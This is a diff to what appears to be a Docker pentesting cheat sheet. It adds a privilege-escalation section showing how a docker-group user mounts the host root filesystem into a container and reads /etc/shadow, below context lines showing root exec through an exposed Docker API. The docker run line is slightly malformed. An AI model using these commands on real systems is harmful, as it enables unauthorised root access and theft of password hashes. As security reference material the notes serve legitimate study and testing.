@@ -22,3 +22,18 @@ $ docker -H <host>:<port> exec -it <container_name> /bin/bash
 root@abc:/# whoami
 root
 ```
+
+## Privilege Escalation
+
+If the current user belong to the `docker` group then he can start a container
+with a binding to files own by root and read them:
+
+```bash
+docker run --it --rm -v /:/mnt alpine:latest /mnt sh
+```
+
+Inside the container shell he can read all the files as root:
+
+```bash
+cat /etc/shadow
+```
